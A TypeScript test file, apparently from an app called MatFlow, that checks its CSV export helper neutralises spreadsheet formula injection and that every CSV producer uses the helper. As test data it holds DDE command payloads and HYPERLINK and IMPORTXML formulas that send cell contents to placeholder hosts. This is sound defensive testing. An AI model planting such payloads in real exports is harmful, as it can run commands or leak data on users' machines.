/**
 * Security lane D (9 Oct 2026) — SEC-052 CSV formula injection.
 *
 * Policy: every CSV MatFlow produces goes through lib/csv.ts (csvCell / csvRow /
 * csvDocument), which prefixes a text cell that a spreadsheet would evaluate
 * with an apostrophe and then RFC-4180-quotes it. The trigger set follows the
 * OWASP "CSV Injection" community page (fetched 9 Oct 2026,
 * community.owasp.org/attacks/CSV_Injection): = + - @, tab (0x09), carriage
 * return (0x0D), line feed (0x0A), and the full-width ＝ ＋ － ＠ that some
 * locales evaluate. The inventory test below fails if a new CSV producer
 * appears that does not use lib/csv.ts.
 */
import { describe, it, expect } from "vitest";
import { readFileSync, readdirSync, statSync } from "node:fs";
import path from "node:path";
import { csvCell, csvDocument, csvRow } from "@/lib/csv";

/** RFC-4180 field decode of one cell produced by csvCell. */
const decode = (cell: string) => (cell.startsWith('"') && cell.endsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell);
const TRIGGERS = ["=", "+", "-", "@", "\t", "\r", "\n", "＝", "＋", "－", "＠"];

describe("SEC-052 csvCell neutralises every formula trigger", () => {
  for (const t of TRIGGERS) {
    it(`a text cell starting with ${JSON.stringify(t)} is prefixed with an apostrophe`, () => {
      const v = `${t}HYPERLINK("https://example.test/?"&A1,"x")`;
      const out = decode(csvCell(v));
      expect(out.startsWith("'")).toBe(true);
      expect(out.slice(1)).toBe(v); // nothing else of the value is lost
    });
  }

  it("classic payloads (DDE, cmd, IMPORTXML) are all neutralised and stay in one cell", () => {
    for (const p of ["=cmd|' /C calc'!A0", "@SUM(1+1)*cmd|' /C calc'!A0", "+1+1", "-2+3", '=IMPORTXML(CONCAT("https://x.test/?",A1),"//a")', "\t=1+1", "\r=1+1"]) {
      const line = csvRow(["ok", p, "tail"]);
      // Three fields survive (the comma/quote/newline in the payload did not split the row).
      const fields = line.match(/("([^"]|"")*"|[^,]*)(,|$)/g)!.filter((f) => f !== "");
      expect(fields.length).toBe(3);
      expect(decode(fields[1].replace(/,$/, "")).startsWith("'")).toBe(true);
    }
  });

  it("numbers we render are data, not formulas (negative amounts are not prefixed); ordinary text is untouched", () => {
    expect(csvCell(-50)).toBe("-50");
    expect(csvCell("Zoé O'Neill")).toBe("Zoé O'Neill");
    expect(csvCell("Smith, John")).toBe('"Smith, John"');
  });

  it("property: no decoded text cell ever begins with a trigger (2,000 generated values)", () => {
    let seed = 7;
    const rnd = () => ((seed = (seed * 1103515245 + 12345) & 0x7fffffff) / 0x7fffffff);
    const alphabet = [...TRIGGERS, "a", "1", " ", '"', ",", "'", "é", "　"];
    for (let i = 0; i < 2000; i++) {
      const len = 1 + Math.floor(rnd() * 8);
      let s = "";
      for (let j = 0; j < len; j++) s += alphabet[Math.floor(rnd() * alphabet.length)];
      const out = decode(csvCell(s));
      expect(TRIGGERS.includes(out[0]), JSON.stringify(s)).toBe(false);
    }
  });

  it("csvDocument starts with the BOM and uses CRLF", () => {
    const doc = csvDocument([["a"], ["=b"]]);
    expect(doc.charCodeAt(0)).toBe(0xfeff);
    expect(doc.slice(1)).toBe("a\r\n'=b");
  });
});

describe("SEC-052 inventory: every CSV producer uses lib/csv.ts", () => {
  const ROOT = path.resolve(__dirname, "../..");
  const files: string[] = [];
  const walk = (dir: string) => {
    for (const name of readdirSync(dir)) {
      const p = path.join(dir, name);
      if (statSync(p).isDirectory()) { if (name !== "node_modules" && !name.startsWith(".")) walk(p); }
      else if (/\.(ts|tsx)$/.test(name) && !/\.test\./.test(name)) files.push(p);
    }
  };
  for (const d of ["app", "components", "lib"]) walk(path.join(ROOT, d));

  it("each file that emits text/csv (or builds a CSV export) imports @/lib/csv", () => {
    // Producers: they set a CSV content type on a response or Blob they BUILD.
    // Readers (uploads, parsers, Drive import) are excluded by name below and listed for review.
    const READERS = new Set([
      "app/api/admin/import/upload/route.ts", // parses an uploaded CSV
      "app/api/onboarding/csv-handoff/route.ts", // stores an uploaded CSV unchanged (owner's own file)
      "app/api/blob-image/route.ts", // refuses CSV blobs to members
      "lib/google-drive.ts", // reads a Drive sheet as CSV
      "lib/import-storage.ts",
      "lib/import-upload.ts",
      "lib/support-session.ts",
      "app/api/payments/route.ts",
      "app/api/stripe/webhook/route.ts",
      "components/dashboard/AttendanceImport.tsx",
      "components/dashboard/ImportPanel.tsx",
      "components/dashboard/ExportCsvButton.tsx", // downloads the server's CSV as-is
      "components/layout/routes.ts",
      "components/onboarding/OwnerOnboardingWizard.tsx",
      "lib/csv.ts",
    ]);
    const producers = files
      .map((f) => path.relative(ROOT, f).split(path.sep).join("/"))
      .filter((rel) => !READERS.has(rel))
      .filter((rel) => /text\/csv/.test(readFileSync(path.join(ROOT, rel), "utf8")));
    expect(producers.length).toBeGreaterThan(0);
    for (const rel of producers) {
      const src = readFileSync(path.join(ROOT, rel), "utf8");
      const usesGuard = /from "@\/lib\/csv"/.test(src) || /exceptionsCsv|manifestCsv/.test(src);
      expect(usesGuard, `${rel} emits CSV without lib/csv.ts`).toBe(true);
    }
  });
});

describe("SEC-052 retest (reviewer R): invisible leading characters, ﹦ and |, semicolon locales", () => {
  const C = (n: number) => String.fromCharCode(n);
  const LEADERS: Array<[string, string]> = [
    ["space", " "], ["NBSP", C(0xa0)], ["BOM", C(0xfeff)], ["zero-width space", C(0x200b)], ["ideographic space", C(0x3000)],
    ["two spaces + NBSP", "  " + C(0xa0)],
  ];
  for (const [label, lead] of LEADERS) {
    it(`a formula behind a leading ${label} is neutralised (apostrophe first, value kept)`, () => {
      const v = `${lead}=HYPERLINK("https://example.test","x")`;
      const out = decode(csvCell(v));
      expect(out.startsWith("'")).toBe(true);
      expect(out.slice(1)).toBe(v);
    });
  }

  it("small equals sign U+FE66 and a leading pipe are neutralised", () => {
    for (const v of [`${C(0xfe66)}1+1`, "|cmd /c calc", ` |cmd`]) expect(decode(csvCell(v)).startsWith("'"), JSON.stringify(v)).toBe(true);
  });

  it("a cell containing ';' is quoted, so a semicolon-locale reader keeps it in one cell", () => {
    expect(csvCell("Ann;=1+1")).toBe('"Ann;=1+1"');
    expect(decode(csvCell("Ann;=1+1"))).toBe("Ann;=1+1");
  });

  it("ordinary values are untouched: inner spaces, a leading space before text, a number", () => {
    expect(csvCell(" Ann Lee")).toBe(" Ann Lee");
    expect(csvCell("Zoe")).toBe("Zoe");
    expect(csvCell(-5)).toBe("-5");
  });
});
